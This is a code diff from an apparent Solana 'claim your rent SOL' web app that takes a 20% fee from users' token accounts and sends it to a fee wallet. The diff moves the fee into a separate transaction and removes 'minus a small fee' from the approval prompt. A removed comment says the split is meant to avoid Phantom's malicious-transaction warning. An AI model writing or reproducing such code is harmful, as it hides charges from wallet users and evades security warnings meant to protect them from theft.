@@ -230,7 +230,7 @@ function HomeContent() {
       // Calculate fee amount (20% of the account's lamports)
       const feeAmount = Math.floor(account.lamports * FEE_PERCENTAGE);
       
-      // Create instructions array
+      // Create instructions array - ONLY for closing the account
       const instructions = [
         // Close account instruction
         spl.createCloseAccountInstruction(
@@ -239,25 +239,30 @@ function HomeContent() {
           publicKey   // Owner of the account
         )
       ];
-      
-      // Add fee transfer instruction if applicable
-      if (feeAmount > 0) {
-        instructions.push(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: FEE_WALLET,
-            lamports: feeAmount
-          })
-        );
-      }
 
-      toast.loading('Please approve the transaction in your wallet. This will close the account and return rent SOL minus a small fee.', { id: 'transaction-prep' });
+      toast.loading('Please approve the transaction in your wallet. This will close the account and return rent SOL.', { id: 'transaction-prep' });
       
+      // First send the transaction to close the account
       const signature = await signAndSendTransaction(provider, instructions, connection);
       
       toast.loading('Closing account...', { id: 'transaction-prep' });
       
       await connection.confirmTransaction(signature);
+      
+      // Then handle the fee in a separate transaction
+      let feeSignature = null;
+      if (feeAmount > 0) {
+        toast.loading('Processing fee transaction...', { id: 'transaction-prep' });
+        
+        const feeInstruction = SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: FEE_WALLET,
+          lamports: feeAmount
+        });
+        
+        feeSignature = await signAndSendTransaction(provider, [feeInstruction], connection);
+        await connection.confirmTransaction(feeSignature);
+      }
       
       const netAmount = account.lamports - feeAmount;
       toast.success(`Successfully claimed ${(netAmount / LAMPORTS_PER_SOL).toFixed(4)} SOL!`, { id: 'transaction-prep' });
@@ -299,21 +304,6 @@ function HomeContent() {
         )
       );
       
-      // Create a separate transaction for the fee transfer
-      // This makes the intent clearer to Phantom and should avoid the malicious warning
-      const feeTransaction = new Transaction();
-      
-      // Add fee transfer instruction if applicable
-      if (totalFeeAmount > 0) {
-        feeTransaction.add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: FEE_WALLET,
-            lamports: totalFeeAmount
-          })
-        );
-      }
-      
       const numAccounts = tokenAccountsToBurn.length;
       toast.loading(`Please approve the transaction in your wallet. This will close ${numAccounts} ${numAccounts === 1 ? 'account' : 'accounts'} and return rent SOL.`, { id: 'transaction-prep' });
       
@@ -328,7 +318,14 @@ function HomeContent() {
       let feeSignature = null;
       if (totalFeeAmount > 0) {
         toast.loading('Processing fee transaction...', { id: 'transaction-prep' });
-        feeSignature = await signAndSendTransaction(provider, [feeTransaction.instructions[0]], connection);
+        
+        const feeInstruction = SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: FEE_WALLET,
+          lamports: totalFeeAmount
+        });
+        
+        feeSignature = await signAndSendTransaction(provider, [feeInstruction], connection);
         await connection.confirmTransaction(feeSignature);
       }
       
